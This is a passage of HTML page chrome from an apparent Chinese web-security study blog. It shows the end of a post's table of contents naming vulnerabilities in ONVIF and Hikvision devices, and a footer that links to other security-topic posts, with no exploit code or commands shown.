href="#onvif%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87cve-2022-30563"><span class="toc-number">3.3.1.2.</span> <span class="toc-text"> ONVIF协议认证绕过CVE-2022-30563</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 任意文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text"> SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.4.</span> <span class="toc-text"> 任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.5.</span> <span class="toc-text"> 未授权命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86"><span class="toc-number">3.4.</span> <span class="toc-text"> 海康威视</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4-3"><span class="toc-number">3.4.1.</span> <span class="toc-text"> 默认口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E7%A0%81-cve-2017-7921"><span class="toc-number">3.4.2.</span> <span class="toc-text"> 海康威视配置文件解码 CVE-2017-7921</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2021-36260"><span class="toc-number">3.4.3.</span> <span class="toc-text"> 命令注入漏洞 CVE-2021-36260</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-14544"><span class="toc-number">3.4.4.</span> <span class="toc-text"> 任意文件读取漏洞 CVE-2021-14544</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.5.</span> <span class="toc-text"> 任意文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.6.</span> <span class="toc-text"> Fastjson远程命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86ak%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.7.</span> <span class="toc-text"> 海康威视AK信息泄露漏洞</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">19</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">低版本php下信息泄露的CVE漏洞与反弹shell</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/20/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EPython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pickle反序列化与Python原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/">常规外网打点-PART3</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">SQL提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/24/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/27/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART1/">常规外网打点-PART1</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">504k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">7:38</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
     ispost: true,
     path: `2026/08/17/常规外网打点-PART3/`,
     favicon: {
